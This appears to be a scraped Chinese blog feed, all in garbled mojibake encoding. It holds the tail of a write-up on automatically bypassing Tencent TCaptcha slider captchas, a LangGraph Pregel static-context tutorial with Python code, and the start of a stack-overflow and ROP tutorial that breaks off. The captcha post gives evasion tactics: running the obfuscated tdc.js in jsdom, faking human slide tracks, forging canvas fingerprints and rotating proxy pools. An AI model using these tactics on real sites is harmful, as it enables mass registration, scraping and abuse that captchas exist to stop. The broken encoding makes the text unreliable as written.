<p>NCC ç®æ³å¨æ»åéªè¯ç åºæ¯ä¸å±ç°åºäºç¸æ¯æ·±åº¦å­¦ä¹ çä¼è¶æ§ãå¨ç²¾åº¦å¯¹æ¯ä¸ï¼NCC è¾¾å°äº 0.10 åç´ çå¹³åç»å¯¹è¯¯å·®ï¼è¿æ¯äºåç´ çº§çç²¾åº¦ï¼èæ·±åº¦å­¦ä¹ æ¨¡åéå¸¸åªè½è¾¾å° 2-5 åç´ çç²¾åº¦ãè¿æ¯å ä¸º TCaptcha çå¾çè´¨éç¨³å®ï¼åè¾¨çåºå®ï¼æ²¡æåªå£°å¹²æ°ï¼ç¼ºå£å½¢ç¶è§åï¼æ¯æ åçæ¼å¾åãå¨è¿ç§åºæ¯ä¸ï¼NCC æ¯åç´ çº§çç²¾ç¡®å¹éï¼èæ·±åº¦å­¦ä¹ æ¯ç¹å¾çº§çè¿ä¼¼å¹éï¼åèå¤©ç¶å·æç²¾åº¦ä¼å¿ãå½ç¶ï¼å¦æå¾çååå¤§ãéè¦æ³åè½åï¼æ·±åº¦å­¦ä¹ ä¼æ´æä¼å¿ï¼ä½å¯¹äº TCaptcha è¿ç§ç¹å®åºæ¯ï¼NCC æ¯æä¼éæ©ã</p>
<p>jsdom æ§è¡ tdc.js çæ¹æ¡ä½ç°äºå·¥ç¨ä¸çå·§å¦æ§ãç´æ¥éå tdc.js çæ··æ·èææºææ¬æé«ï¼ä¼°è®¡éè¦ 2-3 å¨æ¶é´ï¼è jsdom æ¹æ¡åªé 1 å¤©å³å¯å®ç°ãå³é®æ´å¯æ¯ tdc.js çç®çæ¯ééè®¾å¤æçº¹ï¼èéå®ç°å å¯ç®æ³ï¼jsdom æä¾çæµè§å¨ç¯å¢è¶³å¤çå®ï¼è½éè¿å¤§é¨åæ£æµãå³ä½¿ tdc.js æ´æ°çæ¬ï¼ä¹æ éä¿®æ¹ä»£ç ï¼èªå¨ééæ°çæ¬ãå½ç¶ï¼æ½å¨é£é©æ¯ jsdom ç Canvas æçº¹ä¸çå®æµè§å¨æç»å¾®å·®å¼ï¼æªæ¥ TCaptcha å¯è½å¢å  jsdom ç¹å¾æ£æµãåºå¯¹ç­ç¥æ¯å®æçæ§éè¿çï¼ä¸æ¦ä¸éç«å³åæåå ï¼åå¤ Plan B ä½¿ç¨ Puppeteer å¨çå®æµè§å¨ä¸­æ§è¡ tdc.jsã</p>
<p>ä¸¤é¶æ®µæç´¢çæ§è½ä¼åå°è®¡ç®éä» O(WÃH) éä½å° O(W/4 + 13Ã11)ãå¨å¾æç´¢éè¦ 672Ã390 ç­äº 262,080 æ¬¡ NCC è®¡ç®ï¼èä¸¤é¶æ®µæç´¢åªéè¦ 672 é¤ä»¥ 4 å ä¸ 13Ã11ï¼ç­äº 168 å  143ï¼æ»å± 311 æ¬¡ NCC è®¡ç®ãæ§è½æåäº 262,080 é¤ä»¥ 311ï¼çº¦ç­äº 842 åãå®éèæ¶ä»çè®ºä¸ç 250 ç§éä½å° 0.3 ç§ï¼è¿ä½¿å¾ NCC ç®æ³å¨å®æ¶åºæ¯ä¸å®å¨å¯ç¨ã</p>
<h3 id="53-åæ£æµææ¯">5.3 åæ£æµææ¯</h3>
<p>TCaptcha çæ£æµç»´åº¦åæ¬è®¾å¤æçº¹ãæ»å¨è½¨è¿¹ãæ»å¨èæ¶ãPoW è®¡ç®æ¶é´ãç­æ¡ç²¾åº¦ãHTTP è¯·æ±ç¹å¾ç­å¤ä¸ªæ¹é¢ãæä»¬çåºå¯¹ç­ç¥æ¯ï¼è®¾å¤æçº¹æ¹é¢ï¼ä½¿ç¨ jsdom æ¨¡æçå®æµè§å¨ç¯å¢ï¼ç®åå·²éè¿æ£æµãæ»å¨è½¨è¿¹æ¹é¢ï¼ä½¿ç¨ ease-in-out cubic ç¼å¨å½æ°å å¾®æå¨ï¼æ¨¡æäººç±»æ»å¨çå é-åé-åéè¿ç¨ï¼ç®åå·²éè¿æ£æµãæ»å¨èæ¶æ¹é¢ï¼éæºçæ 800-2000 æ¯«ç§ï¼ç¬¦åäººç±»æ»å¨çæ­£å¸¸èå´ï¼ç®åå·²éè¿æ£æµãPoW è®¡ç®æ¶é´æ¹é¢ï¼çå®è®¡ç®ä¸ä¼ªé ï¼ç®åå·²éè¿æ£æµãç­æ¡ç²¾åº¦æ¹é¢ï¼NCC è¾¾å°äºåç´ çº§ç²¾åº¦ï¼è¿è¶äººç±»æ°´å¹³ï¼ç®åå·²éè¿æ£æµãHTTP è¯·æ±ç¹å¾æ¹é¢ï¼å®å¨æ¨¡ææµè§å¨ Headersï¼ç®åå·²éè¿æ£æµã</p>
<p>æªæ¥å¯è½çæ£æµç¹åæ¬ jsdom ç¹æç navigator å±æ§ãCanvas æçº¹çç»è®¡å­¦å¼å¸¸ãé«é¢è¯·æ±ç IP å°ç¦ç­ãå¯¹äº jsdom ç¹å¾æ£æµï¼æä»¬å¯ä»¥å¨ jsdom ç¯å¢ä¸­å é¤æä¿®æ¹ç¹æå±æ§ãå¯¹äº Canvas æçº¹å¼å¸¸ï¼æä»¬å¯ä»¥æ¶éçå®æµè§å¨ç Canvas æçº¹ï¼å¨ jsdom ä¸­ä¼ªé ç¸åçæçº¹ãå¯¹äº IP å°ç¦ï¼æä»¬å¯ä»¥ä½¿ç¨ä»£çæ± åæ£è¯·æ±ã</p>
<h3 id="54-å±éæ§ä¸æ¹è¿æ¹å">5.4 å±éæ§ä¸æ¹è¿æ¹å</h3>
<p>å½åæ¹æ¡çå±éæ§ä¸»è¦æä¸ç¹ãç¬¬ä¸æ¯ä¾èµ Node.jsï¼tdc.js æ§è¡éè¦ Node.js ç¯å¢ï¼å¢å äºé¨ç½²å¤æåº¦ãç¬¬äºæ¯åçº¿ç¨ NCCï¼æªä½¿ç¨å¤æ ¸å¹¶è¡è®¡ç®ï¼æä¼åç©ºé´ãç¬¬ä¸æ¯åºå® APP_IDï¼åªæµè¯äºç²ç¬ç TCaptchaï¼å¶ä»ä¸å¡æ¹å¯è½æå·®å¼ã</p>
<p>æ¹è¿æ¹ååæ¬çº¯ Python å®ç° tdc.jsãGPU å é NCCãæ·±åº¦å­¦ä¹ æ··åæ¹æ¡ç­ãçº¯ Python å®ç° tdc.js éè¦éå <code>__TENCENT_CHAOS_VM</code> å­èç æ ¼å¼ï¼ç¨ Python å®ç° VM è§£éå¨ï¼é¾åº¦æé«ï¼ä½å¯å½»åºå»é¤ Node.js ä¾èµãGPU å é NCC å¯ä»¥ä½¿ç¨ CuPy æ PyTorch å®ç° NCCï¼çè®ºä¸å¯å°èæ¶ä» 0.3 ç§éä½å° 0.05 ç§ï¼ä½éè¦ GPU ç¯å¢ï¼ä¸éåæå¡ç«¯é¨ç½²ãæ·±åº¦å­¦ä¹ æ··åæ¹æ¡å¯ä»¥ç¨ CNN ç²å®ä½ç¼ºå£åºåéä½æç´¢èå´ï¼ç¨ NCC ç²¾ç¡®è®¡ç®ä½ç§»ä¿è¯ç²¾åº¦ï¼å¯è½å°èæ¶éä½å° 0.1 ç§ã</p>
<h3 id="55-ä¼¦çä¸æ³å¾å£°æ">5.5 ä¼¦çä¸æ³å¾å£°æ</h3>
<p>æ¬é¡¹ç®ä»ç¨äºææ¯ç ç©¶åå­¦ä¹ ç®çï¼å±ç¤ºäºéªè¯ç éåå·¥ç¨çå®æ´ææ¯é¾è·¯ãè¯·å¿å°æ¬ææ¯ç¨äºä»»ä½éæ³ç¨éï¼å¦æ¹éæ³¨åãå·åãç¬è«ç­ãéªè¯ç æ¯ç½ç«çå®å¨é²æ¤æªæ½ï¼ç»è¿éªè¯ç å¯è½è¿åæå¡æ¡æ¬¾ãä½¿ç¨æ¬ææ¯é æçä»»ä½æ³å¾åæç±ä½¿ç¨èèªè¡æ¿æãåæ³ä½¿ç¨åºæ¯åæ¬èªå¨åæµè¯ï¼æµè¯èªå·±çç½ç«ï¼ãè¾å©åè½ï¼å¸®å©è§éç¨æ·ï¼ãå­¦æ¯ç ç©¶ï¼éªè¯ç å®å¨æ§åæï¼ç­ã</p>
<h2 id="å­ç»è¯­">å­ãç»è¯­</h2>
<p>æ¬é¡¹ç®ä»é¶å¼å§ï¼å®æ´å®ç°äºå¯¹è¾è®¯ TCaptcha æ»åéªè¯ç çèªå¨åç ´è§£ï¼æ¶åçææ¯æ åæ¬åè®®éåï¼HAR åæãJSONP è§£æãHTTP åè®®æ¨¡æï¼ãå¯ç å­¦ï¼RSA/PKCS#1 v1.5 å å¯ãMD5 PoWï¼ãå¾åå¤çï¼NCC æ¨¡æ¿å¹éãAlpha ééæ©ç ãä¸¤é¶æ®µæç´¢ï¼ãJavaScript éåï¼tdc.js æ··æ· VMãjsdom æ²ç®±æ§è¡ï¼ãç®æ³è®¾è®¡ï¼ease-in-out cubic è½¨è¿¹ä»¿çãå¾®æå¨æ¨¡æï¼ç­å¤ä¸ªé¢åã</p>
<p>æç»å®ç°äº 100% éè¿çã5.6 ç§æ±è§£ãé¶æ·±åº¦å­¦ä¹ ä¾èµçå·¥ç¨åæ¹æ¡ãè¿ä¸ªé¡¹ç®è¯æäºå¨ç¹å®åºæ¯ä¸ï¼ä¼ ç»ç®æ³ï¼NCCï¼å å·¥ç¨æå·§ï¼jsdomï¼å¯ä»¥è¾¾å°çè³è¶è¶æ·±åº¦å­¦ä¹ çææãå¸ææ¬æè½ä¸ºéªè¯ç éåãå¾åå¤çãåç¬è«å¯¹æç­é¢åçç ç©¶èæä¾åèã</p>
<p>â</p>


</div>
<div id="MySignature" role="contentinfo">
    æ¯å¤©å¥½ä¸ç¹ç¹
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-17 17:25">2026-02-17 17:25</span>&nbsp;
<a href="https://www.cnblogs.com/han5562877">å¯å¯æ­ª</a>&nbsp;
éè¯»(<span id="post_view_count">104</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19621722);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19621722', targetLink: 'https://www.cnblogs.com/han5562877/p/19621722/overcoming-tencent-tcaptcha-208tlo', title: 'æ»åè¾è®¯ TCaptcha æ»åéªè¯ç ï¼çº¯ HTTP åè®®éåå®æ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ [æè§£LangChainæ§è¡å¼æ]éæä¸ä¸æå¨Pregelä¸­çåºç¨ ]]></title>
    <link>https://www.cnblogs.com/jaydenai/p/19621105/static-context-in-pregel</link>
    <guid>e06b092fffece272e4cf73ce32b9ce89</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/jaydenai/p/19621105/static-context-in-pregel" title="åå¸äº 2026-02-17 08:23">
    <span role="heading" aria-level="2">[æè§£LangChainæ§è¡å¼æ]éæä¸ä¸æå¨Pregelä¸­çåºç¨</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        å¨ Pregel æ¨¡åä¸­ï¼éæä¸ä¸ææ¯ä¸ä¸ªä¸é¨è®¾è®¡çä¾èµæ³¨å¥å®¹å¨ãå®çåºç°æ¯ä¸ºäºè§£å³å¨å¤æçå¾è®¡ç®ä¸­ï¼å¦ä½ä¼éå°å¤çâä¸å±äºå¾ç¶æï¼ä½Nodeè¿è¡åå¿é¡»ä¾èµçå¤é¨ç¯å¢ä¿¡æ¯âè¿ä¸çç¹ãè¿äºæ°æ®å·æä¸ä¸ªå±åçæ§è´¨ï¼é£å°±æ¯å¨æ´ä¸ªè¿è¡çå½å¨æååªè¯»ä¸åºå®ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>å¨ Pregel æ¨¡åä¸­ï¼éæä¸ä¸ææ¯ä¸ä¸ªä¸é¨è®¾è®¡çä¾èµæ³¨å¥å®¹å¨ãå®çåºç°æ¯ä¸ºäºè§£å³å¨å¤æçå¾è®¡ç®ä¸­ï¼å¦ä½ä¼éå°å¤çâä¸å±äºå¾ç¶æï¼ä½Nodeè¿è¡åå¿é¡»ä¾èµçå¤é¨ç¯å¢ä¿¡æ¯âè¿ä¸çç¹ãè¿äºæ°æ®å·æä¸ä¸ªå±åçæ§è´¨ï¼é£å°±æ¯å¨æ´ä¸ªè¿è¡çå½å¨æååªè¯»ä¸åºå®ï¼æ¯å¦ï¼</p>
<ul>
<li>èº«ä»½ä¿¡æ¯ï¼å½ååèµ·è¯·æ±çuser_idãorg_idã</li>
<li>å¤é¨å®¢æ·ç«¯ï¼å·²å®ä¾åçdb_connectionãredis_clientãvector_storeã</li>
<li>ç­ç¥çº¦æï¼å½åä»»å¡çsafety_levelæbudget_limitã</li>
</ul>
<p>éæä¸ä¸ææ¯ Pregel è¿è¡æ¶æä¾çä¸ä¸ªç±»åå®å¨çç¯å¢åéå®¹å¨ãå®å°æ§è¡ç¯å¢ï¼Contextï¼ä¸ä¸å¡è½¨è¿¹ï¼Stateï¼ç©çéç¦»ï¼ä½¿å¾å¤§å Agent ç³»ç»çæ¶ææ´å æ¨¡ååï¼ä¹æ´å®¹æå¨å¤æççäº§ç¯å¢ä¸è¿è¡æµè¯åè°è¯ã</p>
<p>ä¸åäºä»¥å¾å­å¸å½¢å¼çéç½®ï¼éæä¸ä¸æéç¨å¼ºç±»å Schema å®ä¹æ¹æ³ãç±äºå¶éæåªè¯»çç¹æ§ï¼å®å¨æ´ä¸ªçå½å¨æåä¿æä¸è´æ§ãéæä¸ä¸æå·æ<code>åæ¬¡è¿è¡éå®</code>æºå¶ï¼è¿ä¿è¯Pregelå¯¹è±¡ä¸æ¦è¢«è°ç¨ï¼ä¸ä¸æå¯¹è±¡å¨ææNodeãææ Superstepä¸­å¼ç¨çæ¯åä¸ä¸ªåå­å°åãå®ç<code>éæä¹å</code>ç¹æ§è¿ä¸æ­¥ç¡®ä¿å®ä¸ä¼è¢«åå¥Checkpointï¼æä»¥å½Pregelå ä¸ºéè¯¯åæ­¢å¹¶ä»æ­ç¹æ¢å¤æ¶ï¼æä»¬å¿é¡»éæ°æä¾ä¸ä¸ªç¸åçä¸ä¸æå¯¹è±¡ãç»¼ä¸æç¤ºï¼éæä¸ä¸æä½ä¸ºéåºååçãè¿è¡æ¶ç<code>æè·¯æ³¨å¥</code>èå­å¨ã</p>
<p>éæä¸ä¸æå¨Pregelè¢«ä½ä¸º<code>Runtime</code>çä¸é¨åæ¥ä¼ éçãå¦ä¸æç¤ºçRuntimeç±»çæ³ååæ°ConextTæçå°±æ¯éæä¸ä¸ææ°æ®ç±»åãé¤äºè¿åè¯¥ä¸ä¸æç<code>context</code>å­æ®µï¼Runtimeè¿å·æé¢å¤ä¸ä¸ªå­æ®µåå«è¿åç¨äºé¿æå­å¨ç<code>store</code>å­æ®µï¼è¿åä¸ä¸ªBaseStoreå¯¹è±¡ï¼ãå®ç°âcustomâæµæ¨¡å¼ç<code>stream_writer</code>å­æ®µï¼è¿åä¸ä¸ªStreamWriterå¯¹è±¡ï¼ï¼ä»¥åæä¾å½åä¼è¯ä¸ä¸ä¸ªè¿åå¼ç<code>previous</code>å­æ®µã</p>
<pre><code class="language-python">@dataclass(**_DC_KWARGS)
class Runtime(Generic[ContextT]):
    context: ContextT = field(default=None
    store: BaseStore | None = field(default=None)
    stream_writer: StreamWriter = field(default=_no_op_stream_writer)
    previous: Any = field(default=None)
</code></pre>
<p>Pregelèç¹çå¤çå½æ°è¯»åéæä¸ä¸ææ¯è¾ç¹çï¼ä»¥ä¸ºé¤äºæ¿è½½è¾å¥çåæ°ï¼ä¸è¬æ¯ä¸ä¸ªå­å¸ï¼ï¼æä»¬åªè½é¢å¤å®ä¹ä¸ä¸ª<code>RunnableConfig</code>ç±»åçåæ°ï¼æå³çåºæ¬ä¸åºåå§è¾å¥å¤çå¶ä»ä»»å¡ä¿¡æ¯é½å¾ä»è¿ä¸ªRunnableConfigéç½®ä¸­æåãRunnableConfigæ¯ä¸ä¸ªå­å¸ï¼æä»¥æä»¬è¦æåæéæ°æ®çåææ¯å¾é¢åç¥éå¯¹ç¨å¾Keyãè¿æ ·è®¾è®¡ä¹è½çè§£ï¼å ä¸ºLangGraph.Pregeå¨æ´ä¸ª<code>LangChainå®å®</code>ä¸­ä½ä¸º<code>æ§è¡å¼æ</code>èå­å¨ï¼å®ç¸å½äºLangChainä½ç³»ç<code>åæ ¸</code>ãPregelæä¾çAPIæ¬å°±ä¸æ¯éå¯¹Agentåºç¨å¼åèï¼å¯¹å¼åèåå¥½ä¸æ¯Pregelå¾è®¾è®¡ç®æ ï¼ä¿æè¿ä¸ªåæ ¸è¶³å¤ç®æ´æ´éè¦ã</p>
<p>RunnableConfigå¯¹è±¡ä¼è´¯ç©¿æ´ä¸ªPregelå¼æçæ§è¡ï¼ä¸æ¸¸æµç¨å©ç¨è¿ä¸ªå®åä¸æ¸¸ä¼ éæéçç»ä»¶åæ§å¶ä¿¡æ¯ï¼ä¼ éçä¿¡æ¯å¤§é½è¢«è³äº<code>configurable</code>å­èç¹ä¸ãå¦æå¯¹åºçKeyä»¥<code>__pregel_</code>ä½ä¸ºåç¼ï¼è¡¨ç¤ºè¯¥æ¡ç®å¶å®æ¯ç±Pregelåé¨ä½¿ç¨çãRuntimeå¯¹åºçKeyä¸º<code>__pregel_runtime</code>ã</p>
<p>å¦ä¸è¿ä¸ªä¾å­æ¼ç¤ºäºå¦ä½å£°æãæå®åè¯»åéæä¸ä¸æãæä»¬å®ä¹ä¸ä¸ªæ¿è½½åºæ¬ç¨æ·ä¿¡æ¯çUserInfoæ°æ®ç±»åä½ä¸ºéæä¸ä¸æçSchemaãä½ä¸ºPregelå¯ä¸çNodeï¼å¶å¤çå½æ°æä¾äºä¸ä¸ª<code>RunnableConfig</code>ç±»åçåæ°ï¼æä»¬ä»ä¸­æä¾ä½ä¸ºè¿è¡æ¶çRuntimeå¯¹è±¡ï¼è¿èå¾å°ä½ä¸ºéæä¸ä¸æçUserInfoå¯¹è±¡ã</p>
<pre><code class="language-python">from langchain_core.runnables import RunnableConfig
from langgraph.pregel import Pregel, NodeBuilder
from typing import Any, Literal
from langgraph.channels import LastValue
from langgraph.runtime import Runtime
from dataclasses import dataclass

@dataclass
class UserInfo:
    id: str
    name: str
    gender: Literal["male", "female"]

def handle(args: dict[str, Any], config: RunnableConfig) -&gt; str:
    runtime: Runtime = config["configurable"]["__pregel_runtime"]
    return runtime.context.__repr__()

node = (NodeBuilder()
    .subscribe_only("start")
    .write_to("output")
    .do(handle))
    
app = Pregel(
    nodes={"body": node},
    channels={"start": LastValue(None), "output": LastValue(str)},
    input_channels=["start"],
    output_channels=["output"],
    context_schema=UserInfo,
)

user = UserInfo(id="123", name="Alice", gender="female")
result = app.invoke(input={"start": None}, context=user)
assert result["output"] == user.__repr__()
</code></pre>
<p>å¨åå»ºPregelå¯¹è±¡çæ¶åï¼ä½ä¸ºéæä¸ä¸æçUserInfoç±»åç´æ¥ä»¥æé å½æ°ç<code>context_schema</code>åæ°è¿è¡å£°æãå¨è°ç¨å¶<code>invoke</code>æ¹æ³çæ¶åå°±éè¿contextåæ°å°æå®çUserInfoå¯¹è±¡ä½ä¸ºéæä¸ä¸æä¼ éãéæä¸ä¸æçè®¾è®¡åè¡·å°±æ¯ä¸ºäºè§é¿åºååçéå¶ãå®åè®¸æä»¬å°å¤æçãééçº§çãå¸¦æå¤é¨ä¾èµçå¯¹è±¡çç´æ¥æ³¨å¥ï¼èä¸ä¼ç ´å Pregel æ¨¡åå¯¹<code>ç¶æä¸è´æ§</code>å<code>å¯æä¹å</code>çè¦æ±ã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-17 08:23">2026-02-17 08:23</span>&nbsp;
<a href="https://www.cnblogs.com/jaydenai">JaydenAI</a>&nbsp;
éè¯»(<span id="post_view_count">46</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19621105);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19621105', targetLink: 'https://www.cnblogs.com/jaydenai/p/19621105/static-context-in-pregel', title: '[æè§£LangChainæ§è¡å¼æ]éæä¸ä¸æå¨Pregelä¸­çåºç¨' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ å½æ°è°ç¨æ ä¸Ret2all ]]></title>
    <link>https://www.cnblogs.com/firefly-star/p/19620531</link>
    <guid>006bbdb49b655a2458745daee6924d68</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/firefly-star/p/19620531" title="åå¸äº 2026-02-16 21:19">
    <span role="heading" aria-level="2">å½æ°è°ç¨æ ä¸Ret2all</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        The end of 2025 and stack
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="å½æ°è°ç¨æ ">å½æ°è°ç¨æ </h1>
<h2 id="åºç¡ç¥è¯">åºç¡ç¥è¯</h2>
<p>å¯å­å¨ï¼ ripä¸eipï¼æä»¤å¯å­å¨ï¼cpuä¼æè¯¥å¯å­å¨å°ååçæ°æ®å½ææä»¤æ§è¡ï¼ripæ¯64ä½ç³»ç»çï¼eipæ¯32ä½çï¼<br>
rspä¸espï¼æ é¡¶æéå¯å­å¨ï¼è¡¨æäºæ é¡¶çä½ç½®<br>
rbpä¸ebpï¼æ åºæéå¯å­å¨ï¼è¡¨æäºæ åºçä½ç½®</p>
<p>elfæä»¶å¨å¤å­ååå­ä¸­çæåµå¦å¾<img alt="2N6XUQJ6L_T(EI3JRXE{)CM" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216205805256-1598095327.png" class="lazyload"></p>
<p>æå·¦è¾¹çRWä¸RXå°±æ¯å¯¹åºæ®µçæéï¼Rå³readï¼è¯»ï¼Wå³writeï¼åï¼xå³executeï¼æ§è¡ï¼å¯ä»¥çè§å¤å­ä¸­çæä»¶æç»æ§è¡æ¶é½ä¼æ å°å°åå­ä¸­ï¼åå­ä¸­å¯ä»¥çè§æ æ¯ç±é«å°åå¾ä½å°åå¢é¿çï¼å æ¯ç±ä½å°åå¾é«å°åå¢é¿çãä¸é¢æä»¬çå½æä»¬è°ç¨å½æ°æ¶åçäºä»ä¹ãæ¯å¦å¦ä¸ç¨åºï¼ä»¥64ä½ä¸ºä¾</p>
<p><img alt="84FX7HTTB`D(@VEPZ2NJM5" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216205842373-423677681.png" class="lazyload"><br>
é¦åçè¿å¥å½æ°ç¬¬ä¸æ¡æä»¤ï¼ä¸æ¯intï¼èæ¯{ï¼è¿ä¸ªä¼è¢«ç¼è¯å¨è§£éæpush rbpï¼mov rsp rbpï¼ä¹å°±æ¯åærbpå¥æ ï¼åærspæ¬ä¸æ¥ï¼ç¶ååsub rsp (ä¸ä¸ªç«å³æ°)  ærspæ¬ä¸å»ï¼ææå¦å¾<br>
<img alt="I%EHN9HC59T4)Q@%WW})EK" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216205911357-1586988946.png" class="lazyload"></p>
<p>ç¶åæ¯intï¼intå°±æ¯å£°æåéï¼ä¹å°±æ¯æåéå£°æå¨rbp-å¤å°ï¼æ¥ä¸æ¥ç»§ç»­æ§è¡å°±å°äºè°ç¨è¿ä¸ªwowå½æ°çæ¶åäºï¼è°ç¨å½æ°æ¶éè¿callæä»¤ï¼ä¹å°±æ¯åæå½åæä»¤çä¸ä¸æ¡æä»¤çå°åå¥æ ï¼è¿ä¸ªä¹å°±æ¯æä»¬å¸¸è¯´çè¿åå°åï¼æç¨backä»£æ¿ï¼ï¼æ¥ä¸æ¥åè¿å¥wowå½æ°çæä»¤ï¼è¿ä¸ªå½æ°ç¬¬ä¸æ¡æä»¤åæ¯{ï¼åærbpå¥æ ï¼å ä¸ºrbpè¿æ¯åæ¥mainå½æ°çrbpï¼æä»¥rbp1å°±æ¯æårbpçï¼rspæ¬å°rbpï¼å¦å¾æç¤º<br>
<img alt="S36(WXMSF~`(%EJPQ35B{7" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216205939244-1659014270.png" class="lazyload"><br>
æ¥ä¸æ¥åæ¯sub rsp (ä¸ä¸ªç«å³æ°)ï¼ærspå¾ä¸æ¬ï¼ç¶åæ¯int c;å£°æä¸ä¸ªåécï¼ææå¦å¾<br>
<img alt="6IZ$2H)A7(3{ENKG)8Z_XXX" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216205958050-981314556.png" class="lazyload"><br>
å¶å®æ æº¢åºçåçå°±æ¯éè¿å¾cåå¼ï¼è¦çæ ä¸çè¿ä¸ªè¿åå°åï¼æä»¬æ¥ä¸æ¥çæä»¬æ²¡æ¹è¿åå°åçæ¶åå½æ°è¿åæ¯æä¹è¿åçï¼é¦åæä¸ä¸ªleaveæä»¤ï¼è¿ä¸ªæä»¤å°±æ¯mov rsp rbp</p>
<p><img alt="E{`R{BSFVR~GAW8LFOTI0" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210058725-224301795.png" class="lazyload"><br>
ç¶åpop rbpærspä½ç½®çå¼å¼¹åºæ ï¼èµç»rbpï¼è¿æ¶rbpå·²ç»åå°mainå½æ°é£éäº<br>
<img alt="T(6PQG7T_{V_0${C8RB@JD" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210123364-1122637675.png" class="lazyload"></p>
<p>æ­¤æ¶å¹¶ä¸ä¼ç´æ¥æä¸é¢cåéçæ°å¼éæ¯ï¼èæ¯å¨å°æ¥å£°æåéæ¶å¯ä»¥åå¾è¿å£°æï¼leaveä¹åæ¥ä¸æ¥æ¯retï¼retå°±æ¯pop ripï¼æwowè¿åå°åèµç»æä»¤å¯å­å¨ï¼æ¥ä¸æ¥å°±åè·³è½¬è¿å»æ§è¡æä»¤ã</p>
<p>è¿éå°±å¯ä»¥çåºæ æº¢åºçåçäºï¼å ä¸ºæä»¬å¾æ ä¸åå¼æ¯ç±ä½å°åå¾é«å°åå(å¾ä¸­ç±ä¸å¾ä¸)ï¼æä»¥åªè¦æä»¬æè½ååºcè¿ä¸ªåéå¤§å°çæ¡ä»¶ï¼å°±å¯ä»¥ærbpåè¿åå°åè¦çï¼æ¥ä¸æ¥å°±ä¼è¿åæä»¬åæçè¿åå°åï¼æ¥ä¸æ¥å°±ä¼å»æä»¬æ³è®©ä»è¿åçå°æ¹æ§è¡æä»¤ã</p>
<h2 id="ropé¾åç">ropé¾åç</h2>
<p>å¶å®ropé¾å°±æ¯å¼äºæ ä¸å¯æ§è¡(NXä¿æ¤)æ¶ï¼å ä¸ºä¸è½ç´æ¥åæ±ç¼æä»¤æä»¥éè¿ä¸äºä»£ç çæ®µ(gadget)å»æ§å¶åå¯å­å¨ï¼å¹¶éè¿reté¾æ¥èµ·æ¥çæä»¤ï¼æ¯å¦æä¸ä¸ªå°åä¸­çå°åæ¯pop rdi;retï¼é£æä»¬è¿åå°ååæè¿ä¸ªæä»¤çå°ååï¼ä»å°±ä¼æ§è¡è¿ä¸ªæä»¤pop rdiï¼ç¶åå°±æ¯retï¼å ä¸ºrspæ²¡åï¼æä»¥ä»è¿æ¯å¨æ ä¸åå¼ï¼æä»¥æ¥ä¸æ¥å°±ç±å¯ä»¥å¡«æä»¬æ³è®©ä»è¿åå°çå°åäºã</p>
<h2 id="æ è¿ç§»åç">æ è¿ç§»åç</h2>
<p>æ è¿ç§»ç®åæ¥è¯´å°±æ¯æ§å¶rspï¼ä¸»è¦éè¿æ§å¶rbpç¶åè¿è¡ä¸¤æ¬¡leaveå»æ§å¶ï¼ç¬¬ä¸æ¬¡leaveæ§å¶rbpï¼ç¬¬äºæ¬¡leaveéè¿æ§å¶çrbpè¿èæ§å¶å¯å­å¨,ä¸é¢ä»¥è¿ç§»å°bssæ®µä¸ºä¾ï¼ç¬¬ä¸æ¬¡leave;ret:åmov rsp rbp</p>
<p><img alt="C}`79BKB$1RTBYWL$X(QTI" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210209150-1434536444.png" class="lazyload"></p>
<p>pop rbpä¹å<br>
<img alt="BA`BS9@63E2JK4~}5SDK8L" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210328850-1219018817.png" class="lazyload"></p>
<p>æ¥ä¸æ¥æ¯retï¼ç»§ç»­æ§è¡è¿åå°ååçæä»¤,è³æ­¤ç¬¬ä¸æ¬¡leave;retç»æãå ä¸ºè¿åå°åè¿æ¯leave;retï¼æä»¥æç¬¬äºæ¬¡leave;retï¼<br>
åmov rsp rbp<br>
<img alt="O2)PBM{2$L9XG@PG71W}}`G" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210351414-64722297.png" class="lazyload"><br>
